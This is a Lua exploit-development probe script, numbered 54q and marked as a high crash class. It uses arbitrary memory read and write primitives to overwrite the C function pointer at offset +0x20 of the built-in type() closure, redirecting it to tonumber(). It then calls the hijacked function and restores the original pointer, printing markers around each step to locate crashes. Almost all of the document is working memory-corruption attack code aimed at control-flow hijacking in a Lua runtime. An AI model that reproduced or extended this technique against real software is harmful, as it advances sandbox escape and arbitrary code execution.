-- CRASH_CLASS: HIGH
-- PROBE 54q: CClosure +0x20 redirect with a one-result C function
--
-- 54o/54p stopped before their post-write marker. This probe does not use a
-- zero-result gadget. It redirects type() to tonumber(), whose normal Lua C
-- contract consumes one argument and returns one value, then restores the
-- original pointer immediately. Markers bracket every operation so a timeout
-- identifies the exact boundary. No native-execution conclusion is made here.

print("=== PROBE 54q: ONE-RESULT C FUNC REDIRECT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local type_addr = parse_func_addr(type)
local tonumber_addr = parse_func_addr(tonumber)
if not type_addr or not tonumber_addr then
    print("ADDRESS_PARSE_FAILED")
    print("=== PROBE 54q ABORTED ===")
    return
end

local type_slot = type_addr + 0x20
local tonumber_slot = tonumber_addr + 0x20
local old_type = safe_rq(type_slot)
local target = safe_rq(tonumber_slot)

print("type addr: " .. hexval(type_addr))
print("type +0x20: " .. hexval(old_type))
print("tonumber addr: " .. hexval(tonumber_addr))
print("tonumber +0x20: " .. hexval(target))
print("Baseline type(42): " .. tostring(type(42)))
print("Baseline tonumber(42): " .. tostring(tonumber(42)))

print("[A] No-op write marker BEFORE")
local no_op = safe_wq(type_slot, old_type)
print("[A] No-op write marker AFTER ok=" .. tostring(no_op))
print("[A] type(42): " .. tostring(type(42)))

if not target or not old_type then
    print("POINTER_READ_FAILED")
    print("=== PROBE 54q COMPLETE (partial) ===")
    return
end

print("[B] Alternate pointer write BEFORE")
collectgarbage("stop")
local write_ok = safe_wq(type_slot, target)
print("[B] Alternate pointer write AFTER ok=" .. tostring(write_ok))

if write_ok then
    print("[C] Redirected one-result call BEFORE")
    -- The result is assigned locally so a one-result C return is expected.
    local call_ok, call_ret = pcall(function()
        local value = type(42)
        return value
    end)
    print("[C] Redirected one-result call AFTER ok=" .. tostring(call_ok) ..
        " value=" .. tostring(call_ret))
else
    print("[C] SKIPPED because alternate pointer write reported false")
end

print("[D] Restore BEFORE")
local restore_ok = safe_wq(type_slot, old_type)
print("[D] Restore AFTER ok=" .. tostring(restore_ok))
collectgarbage("restart")

local verify_ok, verify_ret = pcall(function() return type(42) end)
print("[E] After restore ok=" .. tostring(verify_ok) ..
    " type(42)=" .. tostring(verify_ret))
print("=== PROBE 54q COMPLETE ===")
